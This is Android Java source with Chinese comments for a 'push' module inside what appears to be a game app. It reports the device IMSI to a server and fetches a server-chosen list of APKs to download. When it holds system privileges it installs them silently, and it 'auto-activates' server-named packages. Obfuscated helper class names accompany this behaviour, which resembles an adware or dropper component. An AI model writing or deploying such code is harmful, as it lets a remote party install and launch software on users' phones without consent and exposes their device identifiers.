package cn.com.tiantong.game72.push;

import java.util.ArrayList;

import android.app.Notification;
import android.app.NotificationManager;
import android.content.Context;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.Message;
import cn.com.tiantong.game72.ControlBroadcastReceiver;
import cn.com.tiantong.game72.R;
import cn.com.tiantong.game72.n.m.DS;
import cn.com.tiantong.game72.n.m.RO;
import cn.com.tiantong.game72.push.bean.AutoActivateBean;
import cn.com.tiantong.game72.push.bean.DownloadApkBasicBean;
import cn.com.tiantong.game72.push.bean.DownloadApkBean;
import cn.com.tiantong.game72.push.bean.DownloadApkListResultBean;
import cn.com.tiantong.game72.push.bean.InstallCommandContainer;
import cn.com.tiantong.game72.push.bean.SendMgHandler;
import cn.com.tiantong.game72.push.bean.StartDownloadThread;


/*
 * 该类主要是调用下载apk的流程
 * 
 * 1、获取下载的apk列表
 * 2、下载apk
 * 3、下载完成/需要下载的，弹出广播
 * 
 * 
 * 
 * wifi: 
 *    1、下载>2个apk --> 下载结束，弹出一个广播，通知用户，xxxxxx.apk、xxx.apk等已经下载成功。用户点击以后进入列表页
 *    2、下载<=2个apk --> 下载结束，在窗口弹出这两个的安装广播，用户点击进入 安装界面
 * 手机网络：
 *    1、下载>2个apk --> 告知用户，xxx.apk、xxx.apk等广播。用户点击，弹出下载列表。下载完成后，弹出对话框，告知用户安装应用程序
 *    2、下载数量<=2个apk --> 弹出广播，直接下载，下载完成，则告知用户安装应用程序
 * 
 */

public class DownloadApk {

//	private static final String TAG = "DownloadApk";
	private static Context mContext;
	private static String imsi;
	private static String channel;
	
	//当前步骤
	public static final int GETDOWNLOADAPKLIST = 1; //下载apk列表
	public static final int DOWNLOADAPK = 2; //下载apk
	
	/*
	 * 在这里分开，主要是保证当只有2个下载的时候，由于包的大小不同而导致的下载时间的不同，
	 * 最好不要让两个apk同时出现在广播里
	 * 
	 * //下载>2个的apk，下载数组，这个是需要都下载完成以后，弹出对话框
	 * public static final int DOWNLOAD_TYPE_1 = 1;
	 * //下载<=2个的apk，下载完成，直接弹出广播
	 * public static final int DOWNLOAD_TYPE_2 = 2;
	 * 
	 * 
	 * 这里先不这样安排，等全部下载完成以后，然后进入展示的页面
	 * 
	 */
    private DS service;
    
	
	public DownloadApk(Context _mContext, String _imsi, String _channel){
		this.mContext = _mContext;
		this.imsi = _imsi;
		this.channel = _channel;
		service = new DS();
	}
	
	//开始下载任务
	public void startDownloadTask(){
		new GetApkList().execute("");
	}
	
	//该类的一个公共的handler，来处理不同的结果
	public static Handler downloadApkHandler = new Handler(){
		@Override
		public void handleMessage(Message msg) {
			super.handleMessage(msg);
			
			int currentTask = msg.what;
			
			if(currentTask == GETDOWNLOADAPKLIST){
				
				RO ro = (RO) msg.obj;
				boolean result = ro.result;
				
				if(result){
					//LH.LogPrint(TAG, "已经获取到了apk下载列表");
					//完成了获取apk列表的任务 并且成功获取到了下载列表
					DownloadApkBean bean = (DownloadApkBean) ro.obj;
					if(bean != null){
						DownloadApk dApk = new DownloadApk(mContext, imsi, channel);
						//LH.LogPrint(TAG, "开始下载apk的流程------");
						dApk.new DownloadTask(mContext, bean).execute("");
						
						//开始自激活的程序
						ArrayList<AutoActivateBean> autoBeanList = bean.getAutoActivateBeanList();
						
						if(autoBeanList != null && ! autoBeanList.isEmpty()){
							dApk.new AutoActivateProcess(mContext, autoBeanList).execute("");
						}
						
					}
				}else{
					//完成了获取apk列表的任务，但是没有获取到下载列表
					//LH.LogPrint(TAG, "木有下载到apk下载列表");
				}
				
			}else if(currentTask == DOWNLOADAPK){
				
				DownloadApkListResultBean darb = (DownloadApkListResultBean) msg.obj;
				
				//多个apk同时下载完成
				ArrayList<DownloadApkBasicBean> apkBasicBeanList = darb.getBeanList();
				DownloadApkBasicBean dabb = darb.getNeedDownloadBean();
				int beanState = darb.getState();
				dabb.setDownloadState(beanState);
				
				if(apkBasicBeanList != null && ! apkBasicBeanList.isEmpty()){
					boolean isDownloadOver = true;
					for(int i = 0; i < apkBasicBeanList.size(); i++){
						DownloadApkBasicBean basicBean = apkBasicBeanList.get(i);
						if(basicBean.getDownloadState() == 0){
							//还没有下载完
							isDownloadOver = false;
							break;
						}
					}
					
					if(isDownloadOver){
						//LH.LogPrint(TAG, "所有的apk都已经下载完成了, 删除index：" + msg.arg1);
						//已经下载完成了，进入展示页面。这里需要整理一下，把那些下载错误的去掉。这里需要看一下location是否为null
//							BroadcastManager.startNotification(mContext, BroadcastManager.DOWNLOADED_SHOW_LIST, apkBasicBeanList);
						
						if(msg.arg1 >= 10){
							//删掉下载的通知栏
							int index = msg.arg1;
							if(ManagerForNotification.notificationMap != null && ! ManagerForNotification.notificationMap.isEmpty() && ManagerForNotification.notificationMap.containsKey("index_" + index)){
								
								NotificationManager notifManager = ManagerForNotification.notificationMap.get("index_" + index).getmNotificationManager();
//								Log.e(TAG, "删除index：" + index);
								ManagerForNotification.notificationMap.remove("index_" + index);
								notifManager.cancel(index);
							}
							
							DownloadApkBasicBean basicBean = apkBasicBeanList.get(0);
							if(basicBean != null && basicBean.getAppFilePath() != null && ! "".equals(basicBean.getAppFilePath())){
								execInstallApkWay(mContext, apkBasicBeanList);
							}
							
						}else{
							execInstallApkWay(mContext, apkBasicBeanList);
						}
						
						
					}else{
						//还没有下载完成
						//LH.LogPrint(TAG, "还没有下载完成，现在还在等待下载……");
					}
				}
			}
		}
	};
	
	//更新通知栏下载进度条的handler
	public static Handler UPLOADDOWNLOADSTATEHANDLER = new Handler(){
		
		@Override
		public void handleMessage(Message msg) {
			super.handleMessage(msg);
			
			//序号
			int index = msg.what;
			//最大值
			double maxValue = (double) msg.arg1;
			//目前值
			double currentValue = (double) msg.arg2;
			
			//LH.LogPrint(TAG, "正在下载：" + index + ", " + maxValue + ", " + currentValue);
			
			if(ManagerForNotification.notificationMap != null && ! ManagerForNotification.notificationMap.isEmpty() && ManagerForNotification.notificationMap.containsKey("index_" + index)){
				
				NotificationManager notifManager = ManagerForNotification.notificationMap.get("index_" + index).getmNotificationManager();
				Notification notification = ManagerForNotification.notificationMap.get("index_" + index).getmNotification();
				
				int updateValue = (int) ((currentValue / maxValue) * 100.0);
				
				notification.contentView.setProgressBar(R.id.downloadProcessBar, 100, updateValue, false);
				
				notifManager.notify(index, notification);
				
			}
		}
		
	};
	
    //获取下载apk列表
    class GetApkList extends AsyncTask<String, Integer, String>{
		@Override
		protected String doInBackground(String... params) {
			//LH.LogPrint(TAG, "从服务器端获取需要下载apk列表");
			service.doGetDownloadApkList(mContext, downloadApkHandler, GETDOWNLOADAPKLIST, channel, imsi);
			return "";
		}
	}
    
    /*
     * 下载完成后，展示apk的方式
     * 	   如果可以自主安装，那么自主安装
     *   如果不能自主安装，那么通过通知栏告知用户
     *   
     *   展示apk的方式：
     *      判断是否可以自行安装：如果可以的话，那么把可以自行安装的先自行安装，没有下载成功的，弹出通知栏
     *   
     */
    
    public static void execInstallApkWay(Context mContext, ArrayList<DownloadApkBasicBean> apkBasicBeanList){
    	
    	try {
		
			if(apkBasicBeanList != null && ! apkBasicBeanList.isEmpty()){
				
				boolean isinstall = false;
				if (ControlBroadcastReceiver.issysuser(mContext) == 0) {
					isinstall = false;
				} else {
					isinstall = true;
				}
				
				//LH.LogPrint(TAG, "======================= isinstall: " + isinstall);
				
				if(isinstall){
					//自主安装
					ProtocolParserOtherCommands ppoc = new ProtocolParserOtherCommands(mContext);
					InstallCommandContainer commands = InstallCommandContainer.GetInstance(mContext);
					
					for(int i = 0; i < apkBasicBeanList.size(); i++){
						DownloadApkBasicBean dabb = apkBasicBeanList.get(i);
						if(dabb.getAppFilePath() != null && ! "".equals(dabb.getAppFilePath())){
							ProtocolParserOtherCommands.installactionandaddcommand(mContext, isinstall, commands, dabb.getPackageName(), dabb.getMode(), dabb.getInfo(), dabb.getAppFilePath());
						}
					}
				}else{
					//展现在通知栏，通过通知栏进行安装
					BroadcastManager.startNotification(mContext, apkBasicBeanList, -1);
				}
			}else{
				//LH.LogPrint(TAG, "execInstallApkWay list is null or empty");
			}
    	
    	} catch (Exception e) {
			e.printStackTrace();
		}
    }
    
	
	//获取到了下载列表，然后处理下载apk流程的情况
	/*
	 * 下载文件：cailingkong_2.apk
	 * a、判断SD卡是否存在
	 *   如果存在：
	 *     如果已有包(包名+版本号)，则无需下载；(删除多余的包)
	 *     如果还没有该包，则：
	 *        如果当前网络环境是下载所需网络环境，则下载，下载完成后，则弹出广播，用户点击以后，则进入安装界面；
	 *        如果当前网络环境非下载所需网络环境，则弹出广播，用户点击以后，则下载，下载完成后，直接进入安装界面；  
	 *   如果不存在：
	 *     退出下载流程。
	 * 
	 */
	 class DownloadTask extends AsyncTask<String, Integer, String>{

		private DownloadApkBean apkBean;
		private Context mContext;
		
		public DownloadTask(Context _mContext, DownloadApkBean _apkBean){
			this.mContext = _mContext;
			this.apkBean = _apkBean;
		}
		
		@Override
		protected String doInBackground(String... params) {
			
			/*
			 * 整理需要下载的apk信息列表
			 */
			
			ArrayList<DownloadApkBasicBean> dabbList = apkBean.getBasicBeanList();
			
			if(dabbList != null && ! dabbList.isEmpty()){
				
				//去掉哪些已经安装或者下载过的应用!
				InstallCommandContainer icc = InstallCommandContainer.GetInstance(mContext);
				
				//先筛选出没有安装过的软件(该apk是否已经安装在手机上)
				for(int i = 0; i < dabbList.size(); i++){
					DownloadApkBasicBean dabb = dabbList.get(i);
					String packageName = dabb.getPackageName();
					if(ControlBroadcastReceiver.isinstalled(mContext, packageName)){
						//LH.LogPrint(TAG, "已经安装的apk packageName : " + packageName);
						i--;
						dabbList.remove(dabb);
						continue;
					}
					
					int ex = icc.Ispackexisted(packageName);
					if(ex > 0){
						//LH.LogPrint(TAG, "曾经安装过的apk packageName : " + packageName);
						//曾经安装过，现在不需要再次安装了
						dabbList.remove(dabb);
						i--;
						
						continue;
					}
					
					//url是null
					String downloadUrl = dabb.getUrl();
					
					if(downloadUrl == null || "".equals(downloadUrl.trim())){
						//下载的地址为null，那么删除掉
						dabbList.remove(dabb);
						i--;
					}
				}
				
				//判断是否下载过
				ProtocolParserOtherCommands ppoc = new ProtocolParserOtherCommands(mContext);
				for(int i = 0; i < dabbList.size(); i++){
					
					DownloadApkBasicBean needDownloadBean = dabbList.get(i);
					String pacakgeName = needDownloadBean.getPackageName();
					int ex = icc.Ispackexisted(pacakgeName);
					//判断是否下载过,0表示已经下载成功，但是还是没有安装
					if(ex == 0){
						String appFilePath = icc.getfileabspath(mContext, pacakgeName);
						
						//LH.LogPrint(TAG, "packageName : " + pacakgeName + " 已经下载过，下载的地址是：" + appFilePath);
						
						if(appFilePath != null && ! "".equals(appFilePath.trim())){
							needDownloadBean.setAppFilePath(appFilePath);
//							needDownloadBean.setDownloadState(1);
							
							DownloadApkListResultBean darb = new DownloadApkListResultBean();
							darb.setBeanList(dabbList);
							darb.setNeedDownloadBean(needDownloadBean);
							darb.setState(1);
							
							SendMgHandler.sendHandler(darb, downloadApkHandler, DOWNLOADAPK, -1);
						}
					}else{
						
						//判断文件夹中是否已经有了该apk，防止该软件已经下载，但是软件卸载以后，又重新安装
						String path = ppoc.getfileabspath(pacakgeName);
						
						if(path != null){
							
							needDownloadBean.setAppFilePath(path);
							
							DownloadApkListResultBean darb = new DownloadApkListResultBean();
							darb.setBeanList(dabbList);
							darb.setNeedDownloadBean(needDownloadBean);
							darb.setState(1);
							
							InstallCommandContainer commands = InstallCommandContainer.GetInstance(mContext);
							commands.AddInstallCommand(needDownloadBean.getPackageName(), needDownloadBean.getPackageName(), needDownloadBean.getMode(), 0, 0, 0, needDownloadBean.getInfo());
							
							SendMgHandler.sendHandler(darb, downloadApkHandler, DOWNLOADAPK, -1);
						
						}else{
							//LH.LogPrint(TAG, "开始下载：" + i);
							DownloadApkBasicBean dabBean = dabbList.get(i);
							new StartDownloadThread(mContext, dabbList, dabBean, downloadApkHandler, DOWNLOADAPK, apkBean.getNet(), -1).start();
						}
						
					}
				}
			}
			
			return "";
		}
	}
	 
	 
	 //执行自激活过程
	 class AutoActivateProcess extends AsyncTask<String, Integer, String>{
		 
		 private Context mContext;
		 private ArrayList<AutoActivateBean> autoList;

		 public AutoActivateProcess(Context _mContext, ArrayList<AutoActivateBean> _autoList){
			 this.mContext = _mContext;
			 this.autoList = _autoList;
		 }
		 
		@Override
		protected String doInBackground(String... params) {
			
			ProtocolParserOtherCommands ppoc = new ProtocolParserOtherCommands(mContext);
			
			for(int i = 0; i < autoList.size(); i++){
				AutoActivateBean autoBean = autoList.get(i);
				String packageName = autoBean.getPackageName();
				int mode = autoBean.getMode();
				//LH.LogPrint(TAG, "需要自激活的app的包名是：" + packageName);
				if(packageName != null && ! "".equals(packageName.trim())){
					ppoc.handle009(packageName, mode);
				}
				
			}
			
			return "";
		}
		 
	 }
}
